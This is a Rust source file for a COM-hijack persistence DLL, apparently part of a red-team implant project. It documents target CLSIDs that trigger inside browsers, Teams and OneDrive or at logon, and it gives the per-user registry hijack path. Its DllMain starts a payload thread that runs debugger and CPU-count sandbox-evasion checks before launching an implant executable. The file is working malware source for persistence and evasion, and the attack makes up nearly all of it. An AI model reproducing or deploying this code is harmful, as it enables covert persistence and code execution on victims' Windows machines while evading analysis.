//! COM Hijack DLL — T1546.015
//!
//! cdylib target. Exports DllMain which Windows calls when the DLL is loaded
//! as part of a COM object instantiation (HKCU CLSID InprocServer32 hijack).
//!
//! Mechanism:
//!   1. HKCU\SOFTWARE\Classes\CLSID\{TARGET_GUID}\InprocServer32 = path/to/this.dll
//!   2. Any process that instantiates the target COM object loads this DLL.
//!   3. DllMain spawns a payload thread via raw CreateThread and returns TRUE.
//!   4. Payload thread runs C2 or spawns main implant EXE.
//!
//! Privilege: Medium integrity. HKCU hijack works without elevation.
//! Exception: elevated (high integrity) processes load COM from HKLM only.
//!
//! CLSID targets:
//!   {54E211B6-3650-4F75-8334-FA359598E1C5} — directmanipulation.dll
//!     Triggers inside Chrome (v127+), Edge, Microsoft Teams, OneDrive.
//!     SpecterOps 2025: best choice for browser-context execution.
//!   {0358B920-0AC7-461F-98F4-58E32CD89148} — CacheTask (wininet.dll)
//!     Triggers at every user logon via Task Scheduler CacheTask.
//!     PentestLab confirmed persistent.
//!
//! DllMain rules:
//!   - Return 1 (TRUE) always. Returning FALSE unloads immediately (sandbox flag).
//!   - Use raw CreateThread, NOT std::thread::spawn (Rust runtime calls LoadLibrary
//!     inside loader lock → deadlock). Reference: rust-lang/rust#84981.
//!   - Never call process::exit() or abort() from DllMain (crashes host).
//!
//! Detection: detection/sigma/persistence_com_hijack.yml
//! MITRE: T1546.015 — Event Triggered Execution: COM Hijacking

pub mod install;

#[cfg(windows)]
use core::ffi::c_void;
#[cfg(windows)]
use windows_sys::Win32::{
    Foundation::HINSTANCE,
    System::{
        LibraryLoader::DisableThreadLibraryCalls,
        SystemServices::DLL_PROCESS_ATTACH,
        Threading::{CreateThread, THREAD_CREATION_FLAGS},
    },
};

/// DLL base address — stored on attach, used by payload thread for path resolution.
#[cfg(windows)]
static mut HMOD: HINSTANCE = 0;

/// DllMain entry point — called by Windows loader.
///
/// On DLL_PROCESS_ATTACH: store HINSTANCE, suppress thread notifications,
/// spawn payload thread via CreateThread (NOT std::thread), return TRUE.
///
/// # Safety
/// Called by Windows loader while holding the loader lock.
/// Must not call LoadLibrary, CoInitialize, registry, or User32 functions here.
/// Payload work goes into the spawned thread.
#[cfg(windows)]
#[no_mangle]
#[allow(non_snake_case)]
pub unsafe extern "system" fn DllMain(
    hmod: HINSTANCE,
    call_reason: u32,
    _: *mut c_void,
) -> i32 {
    if call_reason == DLL_PROCESS_ATTACH {
        HMOD = hmod;
        // Suppress DLL_THREAD_ATTACH / DLL_THREAD_DETACH callbacks.
        // Reduces DllMain call frequency and eliminates spurious re-entry.
        DisableThreadLibraryCalls(hmod);
        // Spawn payload thread. CreateThread returns immediately — loader lock
        // is released before the new thread runs any code.
        CreateThread(
            core::ptr::null(),
            0,
            Some(payload_thread),
            core::ptr::null(),
            THREAD_CREATION_FLAGS(0),
            core::ptr::null_mut(),
        );
    }
    1 // TRUE — always return 1; returning 0 causes immediate DLL unload
}

/// Payload thread — runs after loader lock is released.
/// Performs sandbox checks and launches the implant.
#[cfg(windows)]
unsafe extern "system" fn payload_thread(_: *mut c_void) -> u32 {
    // Sandbox check: skip if running in an analysis environment.
    // Check for debugger (PEB.BeingDebugged) or low CPU count.
    if is_sandboxed() {
        return 0;
    }

    // Determine DLL's own directory (implant EXE should be sibling).
    let dll_dir = get_dll_directory();

    // Attempt to spawn the main implant EXE from the DLL's directory.
    if let Some(dir) = dll_dir {
        let implant_path = format!("{}\\oxide-implant.exe", dir);
        let _ = std::process::Command::new(&implant_path).spawn();
    }

    0
}

/// Minimal sandbox check: return true if PEB.BeingDebugged is set or
/// the system has fewer than 2 logical CPUs (common in sandboxes).
#[cfg(windows)]
unsafe fn is_sandboxed() -> bool {
    // PEB.BeingDebugged at gs:[0x60] + 0x02
    let peb: *const u8;
    core::arch::asm!(
        "mov {}, qword ptr gs:[0x60]",
        out(reg) peb,
        options(nostack, preserves_flags),
    );
    if *peb.add(0x02) != 0 { return true; } // BeingDebugged

    // CPU count via GetSystemInfo — too few = sandbox
    use windows_sys::Win32::System::SystemInformation::{GetSystemInfo, SYSTEM_INFO};
    let mut si: SYSTEM_INFO = core::mem::zeroed();
    GetSystemInfo(&mut si);
    if si.dwNumberOfProcessors < 2 { return true; }

    false
}

/// Get the directory of this DLL by querying its own module path.
#[cfg(windows)]
fn get_dll_directory() -> Option<String> {
    use windows_sys::Win32::System::LibraryLoader::GetModuleFileNameW;
    let mut buf = [0u16; 260];
    let len = unsafe { GetModuleFileNameW(unsafe { HMOD }, buf.as_mut_ptr(), 260) };
    if len == 0 { return None; }
    let path = String::from_utf16_lossy(&buf[..len as usize]);
    // Trim filename, keep directory
    let dir = std::path::Path::new(&path).parent()?;
    Some(dir.to_string_lossy().into_owned())
}

// Stub for non-Windows builds (cdylib is Windows-only but the workspace compiles on Linux).
#[cfg(not(windows))]
#[no_mangle]
pub extern "system" fn DllMain() -> i32 { 1 }
